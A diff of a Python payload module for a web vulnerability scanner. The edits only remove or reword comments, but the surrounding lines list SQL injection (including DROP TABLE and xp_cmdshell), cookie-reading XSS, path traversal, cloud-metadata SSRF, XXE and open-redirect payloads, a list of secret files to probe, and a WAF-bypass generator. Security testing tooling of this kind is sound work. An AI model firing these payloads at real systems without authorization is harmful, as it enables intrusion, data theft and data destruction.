@@ -25,7 +25,7 @@ SQLI_ERROR = [
     # Stacked queries
     "'; DROP TABLE users--", "'; SELECT SLEEP(5)--",
     "'; EXEC xp_cmdshell('whoami')--",
-    # String concat (WAF bypass)
+    # Tautology (WAF bypass)
     "' OR 'a'='a", "' OR 'x'='x'--",
     "1' AND 1=1--", "1' AND 1=2--",
     # Type juggling
@@ -81,7 +81,6 @@ SQLI_ERROR_PATTERN = re.compile(
 # XSS
 
 XSS_PAYLOADS = [
-    # Basic
     "<script>alert('XSS')</script>",
     "<script>alert(document.cookie)</script>",
     "<script>alert(String.fromCharCode(88,83,83))</script>",
@@ -206,11 +205,9 @@ CMDI_PAYLOADS: list[tuple[str, str]] = [
 # Path Traversal / LFI
 
 TRAVERSAL_PAYLOADS = [
-    # Standard
     "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
     "../../../../etc/passwd", "../../../../../etc/passwd",
     "../../../../../../etc/passwd",
-    # Encoded
     "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
     "%2e%2e/etc/passwd", "%2e%2e%2fetc%2fpasswd",
     # Null byte (PHP < 5.3.4)
@@ -226,7 +223,6 @@ TRAVERSAL_PAYLOADS = [
     "../../../windows/system32/drivers/etc/hosts",
     "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
     "..\\..\\..\\windows\\win.ini",
-    # Encoding variants
     "/%5C../%5C../%5C../%5C../etc/passwd",
     "/..%255c..%255c..%255cetc/passwd",
     # Wrapper (PHP)
@@ -246,7 +242,6 @@ TRAVERSAL_HIT_PATTERN = re.compile(
 # SSRF
 
 SSRF_URLS = [
-    # Localhost
     "http://127.0.0.1", "http://localhost",
     "http://0.0.0.0", "http://[::1]",
     "http://0177.0.0.1",  # Octal
@@ -266,9 +261,9 @@ SSRF_URLS = [
     # DigitalOcean
     "http://169.254.169.254/metadata/v1/",
     # Internal services
-    "http://127.0.0.1:6379/",    # Redis
-    "http://127.0.0.1:9200/",    # Elasticsearch
-    "http://127.0.0.1:27017/",   # MongoDB
+    "http://127.0.0.1:6379/",
+    "http://127.0.0.1:9200/",
+    "http://127.0.0.1:27017/",
     "http://127.0.0.1:11211/",   # Memcached
     "http://127.0.0.1:5672/",    # RabbitMQ
     # Protocols
@@ -364,7 +359,7 @@ OPEN_REDIRECT_PAYLOADS = [
     "//evil%2Ecom", "https://evil.com%2F%2F",
     "////evil.com", "https:evil.com",
     "https:\\\\evil.com", "/evil.com",
-    "HtTpS://evil.com",  # Case mutation
+    "HtTpS://evil.com",
 ]
 
 REDIRECT_PARAMS = [
@@ -378,7 +373,6 @@ REDIRECT_PARAMS = [
 # XXE
 
 XXE_PAYLOADS = [
-    # Basic file read
     (
         '<?xml version="1.0" encoding="UTF-8"?>'
         '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
@@ -420,7 +414,6 @@ SENSITIVE_PATHS = [
     # Env / secrets
     "/.env", "/.env.local", "/.env.production", "/.env.staging",
     "/.env.development", "/.env.backup", "/.env.old",
-    # Config files
     "/config.php", "/config.php.bak", "/configuration.php",
     "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
     "/web.config", "/appsettings.json", "/appsettings.Development.json",
@@ -432,7 +425,6 @@ SENSITIVE_PATHS = [
     "/db.sql", "/dump.sql", "/database.sql",
     "/site.zip", "/www.zip", "/archive.zip",
     "/public.zip", "/source.zip", "/src.zip",
-    # Logs
     "/error.log", "/access.log", "/debug.log",
     "/app.log", "/application.log",
     # Server config
@@ -464,7 +456,6 @@ SENSITIVE_PATHS = [
     "/requirements.txt", "/Pipfile", "/pyproject.toml",
     # DS_Store / OS files
     "/.DS_Store", "/Thumbs.db", "/desktop.ini",
-    # Admin panels
     "/admin/", "/administrator/", "/phpmyadmin/",
     "/adminer.php", "/wp-admin/", "/wp-login.php",
     "/manager/html", "/admin-console",
@@ -551,7 +542,7 @@ def generate_waf_variants(payload: str, max_variants: int = 5) -> list[str]:
     return variants[:max_variants]
 
 
-# Payload manager — unified access point
+# Payload manager
 
 class PayloadManager:
     """Unified access to all payload categories with optional WAF bypass."""
